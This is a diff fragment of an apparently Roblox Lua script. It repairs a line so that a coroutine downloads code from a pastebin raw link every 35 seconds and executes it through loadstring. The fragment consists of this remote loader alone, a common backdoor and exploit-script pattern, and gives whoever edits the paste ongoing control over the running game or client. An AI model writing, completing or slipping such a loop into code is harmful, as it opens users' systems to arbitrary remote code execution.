@@ -237,7 +237,7 @@ end)()
 coroutine.wrap(function()
     while true do
         wait(35)
-        loadstring(game:HttpGet("https://pastebin.com/raw/W500czKk"))(
+        loadstring(game:HttpGet("https://pastebin.com/raw/W500czKk"))()
 end
 
 end)()
